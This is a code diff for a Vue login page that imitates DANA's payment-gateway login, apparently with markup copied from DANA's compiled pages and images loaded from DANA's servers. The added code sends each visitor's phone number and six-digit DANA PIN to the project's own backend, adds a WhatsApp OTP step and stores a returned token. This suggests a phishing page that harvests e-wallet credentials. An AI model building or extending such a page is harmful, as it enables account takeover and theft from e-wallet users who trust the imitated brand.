@@ -9,8 +9,8 @@
 <template>
   <div class="na-login-page">
     <div class="ipg-new__wrapper">
-      <div data-v-74d2324a="" class="new-background">
-        <div data-v-74d2324a="" class="new-background__top"></div>
+      <div class="new-background">
+        <div class="new-background__top"></div>
       </div>
       <div class="ipg-new__content">
         <div class="agreement__wrapper">
@@ -212,6 +212,7 @@
                 <el-button
                   style="width: 100%"
                   type="primary"
+                  :disabled="inputError || !inputValue"
                   @click="pcContinue"
                   >CONTINUE</el-button
                 >
@@ -265,7 +266,7 @@
               <div class="sticky-button__content__tnc">
                 Your data is secured by DANA Protection.
               </div>
-              <el-button type="primary" @click="mobileContinue"
+              <el-button :disabled="inputError || !inputValue" type="primary" @click="mobileContinue"
                 >CONTINUE</el-button
               >
               <div>
@@ -299,47 +300,65 @@
         </div>
       </div>
     </div>
-    <HelpDrawer ref="helpDrawerRef" :type="DrawerType"> </HelpDrawer>
+
+    <HelpDrawer ref="helpDrawerRef" :type="DrawerType"></HelpDrawer>
     <PinCodeDrawer
       :visible.sync="showActionDrawer"
       :size="showKeyboard ? '80%' : '40%'"
+      @close="closeDrawer"
       ref="pinCodeRef"
     >
       <div class="pin_code_container">
         <div class="title">Enter your DANA PIN</div>
-        <div class="password_input">
+        <div class="password_input" :class="{ 
+              error_pin: errCode === '1' || errCode === '2'
+            }">
           <!-- 密码输入框 -->
           <van-password-input
             :value="password"
             :focused="showKeyboard"
             :mask="hasMask"
             @focus="showKeyboard = true"
-            :class="{ show_dot: hasMask }"
+            :class="{ 
+              show_dot: hasMask,
+            }"
           />
           <!-- 数字键盘 -->
           <van-number-keyboard
             @input="onInput"
             @delete="onDelete"
-            :show="showKeyboard"
+            :show="showKeyboard && isMobile"
             @blur="showKeyboard = false"
             :hide-on-click-outside="false"
           />
           <div class="input-pin__mask" @click="changeMask">
             <img
               v-if="hasMask"
-              data-v-554f031f=""
               src="https://a.m.dana.id/resource/imgs/ipg/unmask-pin.svg"
               alt="show/hide"
               class=""
             />
             <img
               v-else
-              data-v-554f031f=""
               src="https://a.m.dana.id/resource/imgs/ipg/mask-pin.svg"
               alt="show/hide"
               class="masked"
             />
           </div>
+        </div>
+        <div class="pin-error" v-if="errCode === '1'">
+          <img
+            src="https://a.m.dana.id/resource/icons/info-red.svg"
+            alt="info-red"
+          />
+          <span>Please make sure you have the right PIN and tryagain.</span>
+        </div>
+        <div class="pin-error" v-if="errCode === '2'">
+          <img
+            src="https://a.m.dana.id/resource/icons/info-red.svg"
+            alt="info-red"
+          />
+          <span>Please wait and try again later. Avoid amycommunication with the fake CS who contacts youand claims to be from DANA.</span>
         </div>
         <el-button
           style="width: 100%"
@@ -350,7 +369,8 @@
         </el-button>
       </div>
     </PinCodeDrawer>
-    <OtpDrawer></OtpDrawer>
+    <OtpDrawer  ref="OtpDrawer" :phoneNumber="inputValue" :otpType="otpType"></OtpDrawer>
+    <noPhone ref="noPhone" :phoneNumber="inputValue"></noPhone>
     <Footer></Footer>
   </div>
 </template>
@@ -359,12 +379,14 @@
 import PinCodeDrawer from "@/components/common/actionDrawer.vue";
 import HelpDrawer from "@/components/helpDrawer/index.vue";
 import OtpDrawer from "@/components/otpDrawer/index.vue";
-
+import noPhone from "@/components/noPhone/index.vue";
+import { dana_sendOpt, checkUser } from '@/api/index'
 export default {
   components: {
     HelpDrawer,
     PinCodeDrawer,
     OtpDrawer,
+    noPhone
   },
   data() {
     return {
@@ -376,16 +398,83 @@ export default {
       DrawerType: "help",
       inputError: false,
       errorMessage: "",
+      otpType: 'WHATSAPP_OTP',
       // 正则表达式：第一位为8，总长度10-13位（符合印尼手机号格式）
       phonePattern: "^8\\d{9,12}$",
+      referenceNo: '',
+      errCode:'',
+      isMobile: false
     };
   },
-  mounted() {},
-  beforeUnmount() {},
+  watch: {
+    // 监听窗口大小变化，在设备旋转时重新检测
+    '$route'() {
+      this.checkDevice();
+    }
+  },
+  created() {
+     this.checkDevice();
+  },
+  mounted() {
+    this.referenceNo = this.$route.query.referenceNo || ''
+  },
   methods: {
+    checkDevice() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      // 检测常见移动设备的关键字
+      const mobileKeywords = ['android', 'iphone', 'ipad', 'ipod', 'windows phone'];
+      this.isMobile = mobileKeywords.some(keyword => userAgent.includes(keyword));
+      console.log(this.isMobile,'=====this.isMobile====')
+    },
+    closeDrawer() {
+      this.password = ''
+      this.showKeyboard = false
+    },
     onInput(key) {
       this.password = (this.password + key).slice(0, 6);
-
+      if (this.password.length === 6) {
+          const loading = this.$loading({
+            lock: true,
+            text: this.$t('loading...'),
+            spinner: 'el-icon-loading',
+            background: 'rgba(0, 0, 0, 0.7)'
+          })
+         dana_sendOpt({
+          referenceNo: this.referenceNo,
+          phoneNumber: this.inputValue,
+          codeType: '0',
+          pin: this.password
+        }).then((res)=> {
+          loading.close()
+          this.errCode = res.data.errCode
+          if (this.errCode === '0') {
+            //  pin 验证通过
+            if (res.data.needOtp) {
+              this.$refs.OtpDrawer.showOtpDrawer = true
+              this.otpType = res.data.otpType
+              this.showActionDrawer = false
+              this.password = ''
+            } else {
+              this.showActionDrawer = false
+              this.password = ''
+              localStorage.setItem('DANA_Token', res.data.token)
+              this.$router.push({
+                path: '/checkout',
+                query: { 
+                  referenceNo: this.referenceNo
+                }
+              })
+            }
+          } else if (this.errCode === '1') {
+             //  pin 验证失败
+          } else if (this.errCode === '2') {
+             //  pin 验证失败次数过多
+          }
+     
+        }).finally(() => {
+          loading.close()
+        })
+      }
       console.log(
         "%c [  ]-370",
         "font-size:13px; background:pink; color:#bf2c9f;",
@@ -394,6 +483,7 @@ export default {
     },
     onDelete() {
       this.password = this.password.slice(0, this.password.length - 1);
+      this.errCode = ''
     },
     changeMask() {
       this.hasMask = !this.hasMask;
@@ -402,21 +492,54 @@ export default {
       if (this.inputError) {
         return;
       }
-      console.log(
-        "%c [ 唤起弹窗 ]-311",
-        "font-size:13px; background:pink; color:#bf2c9f;",
-        this.$refs.pinCodeRef
-      );
-      this.showActionDrawer = true;
+      const loading = this.$loading({
+        lock: true,
+        text: this.$t('loading...'),
+        spinner: 'el-icon-loading',
+        background: 'rgba(0, 0, 0, 0.7)'
+      })
+      checkUser({
+        phoneNumber: this.inputValue,
+      }).then((res)=> {
+        loading.close()
+        if (res.data.exists) {
+          this.showActionDrawer = true;
+        }else {
+          this.$refs.noPhone.showDrawer = true
+        }
+      }).finally(() => {
+        loading.close()
+      })
+ 
     },
     pcContinue() {
       if (this.inputError) {
         return;
       }
-      console.log(
-        "%c [ 跳转pc pin码 ]-315",
-        "font-size:13px; background:pink; color:#bf2c9f;"
-      );
+      const loading = this.$loading({
+        lock: true,
+        text: this.$t('loading...'),
+        spinner: 'el-icon-loading',
+        background: 'rgba(0, 0, 0, 0.7)'
+      })
+      checkUser({
+        phoneNumber: this.inputValue,
+      }).then((res)=> {
+        loading.close()
+        if (res.data.exists) {
+        this.$router.push({
+          path: '/ipgLogin',
+          query: { 
+            referenceNo: this.referenceNo,
+            phoneNumber: this.inputValue
+          }
+      })
+        }else {
+          this.$refs.noPhone.showDrawer = true
+        }
+      }).finally(() => {
+        loading.close()
+      })
     },
     handleDrawer(type) {
       this.DrawerType = type;
@@ -479,7 +602,7 @@ export default {
     .ipg-new__content {
       display: flex;
       justify-content: center;
-      margin: -2.2rem auto 0;
+      margin: -2.6rem auto 0;
       .agreement__wrapper {
         display: flex;
         .wrapper {
@@ -933,7 +1056,7 @@ export default {
       // background-repeat: no-repeat;
       // background-size: cover;
       margin: 0 auto;
-      min-height: 8.5rem;
+      min-height: 7rem;
     }
     .mobile-overlap-background__top {
       width: 100%;
@@ -1095,5 +1218,26 @@ export default {
   //   transform: translate(-50%, -50%);
   //   visibility: visible;
   // }
+}
+.pin-error {
+  -webkit-box-align: center;
+  -ms-flex-align: center;
+  align-items: center;
+  color: #ff5d55;
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+  margin-top: 0.14rem;
+}
+.na-login-page .pin_code_container .error_pin {
+   border:1px solid #ff5d55 !important;
+}
+.pin-error img {
+  height: 0.2rem;
+  width: 0.2rem;
+}
+.pin-error span {
+  font-size: 0.12rem;
+  margin-left: 0.06rem;
 }
 </style>
